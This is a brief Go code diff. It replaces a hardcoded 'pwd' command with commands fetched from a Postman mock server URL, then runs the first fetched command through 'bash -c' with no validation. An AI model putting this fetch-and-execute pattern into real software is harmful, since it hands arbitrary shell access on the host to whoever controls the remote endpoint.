@@ -15,13 +15,8 @@ type RESPONSE struct {
 }
 
 func main() {
-	lol := `{ "commands": ["pwd"]}`
 	response := RESPONSE{}
-	err := json.Unmarshal([]byte(lol), &response)
-	if err != nil {
-		return
-	}
-	//requestTodoAndParse(&response, "https://jsonplaceholder.typicode.com/posts/1")
+	requestTodoAndParse(&response, "https://dd356dc5-d87a-4860-b8e0-948eea6911a0.mock.pstmn.io/")
 	var stdout bytes.Buffer
 	var stderr bytes.Buffer
 	cmd := exec.Command("bash", "-c", response.Commands[0])
